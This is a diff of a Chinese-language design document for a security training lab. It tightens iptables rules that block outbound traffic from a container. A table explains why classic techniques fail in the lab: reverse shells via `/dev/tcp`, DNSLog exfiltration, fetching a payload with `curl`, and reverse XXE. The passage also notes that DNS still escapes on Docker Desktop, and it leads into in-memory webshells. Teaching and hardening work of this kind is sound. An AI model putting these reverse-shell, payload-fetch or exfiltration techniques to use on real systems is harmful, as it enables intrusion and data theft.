@@ -370,22 +370,31 @@ lab 05 因此把 flag 作为教学装置放进服务端内存（应用模块全�
 lab 07 的 `entrypoint.sh` 在容器内执行（实测生效 ✅）：
 
 ```sh
-iptables -A OUTPUT -o eth0 -p tcp --syn -j DROP      # 丢弃新建的对外 TCP 连接
-iptables -A OUTPUT -o eth0 -p udp --dport 53 -j DROP # 丢弃 DNS 查询
+iptables -A OUTPUT ! -o lo -p tcp --syn -j DROP   # 丢弃所有非环回的新建 TCP 连接
+iptables -A OUTPUT -p udp --dport 53 -j DROP      # 丢弃所有接口上的 DNS（UDP）
+iptables -A OUTPUT -p tcp --dport 53 -j DROP      # DNS over TCP 一并丢
 ```
+
+（`! -o lo` 而不是 `-o eth0`：接口名不保证叫 eth0；环回必须放行，因为容器内的验证
+脚本要打 `127.0.0.1`。DNS 规则不加 `-o` 限定，因为 Docker 内嵌解析器在 `127.0.0.11`
+走的是环回。）
 
 后果：
 
 | 经典手法 | 为什么失效 |
 |----------|-----------|
 | 反弹 shell（`bash -i >& /dev/tcp/...`） | 目标主动发起的 TCP 首包是 SYN，被 DROP |
-| DNSLog 外带 | UDP/53 被 DROP；TCP DNS 也要新建连接 |
+| DNSLog 外带 | **平台相关**：原生 Linux 上 UDP/53 被 DROP；Docker Desktop 上 Docker 内嵌解析器（`127.0.0.11`）的包不经过容器 netfilter，仍可解析（实测规则计数为 0）。详见 [`MEMSHELL.md`](MEMSHELL.md) 2.1.1 |
 | 外连下载 payload / `curl vps/x.sh` | 同反弹 shell |
 | 反向 XXE / 任何「目标连回来」 | 同上一类 |
 | 时间信道（等外部服务超时） | 超时点可能不可控，但**仍可用**（本地计算耗时不受影响） |
 
 而**入站端口照常工作**：宿主机映射进来的连接，其**回包不是 SYN**，所以
 `docker run -p 8097:5000` 之后你照样能从宿主机访问。这一点是内存马能成立的前提。
+
+> 结论要说准确：**「不出网」在原生 Linux 上意味着连 DNS 也出不去，
+> 在 Docker Desktop 上只意味着 TCP 出不去。**
+> 部署到比赛平台后请按上面的表格自己复验一遍，别照抄结论。
 
 ### 8.2 内存马：把能力挂到已有的入站通道上
 
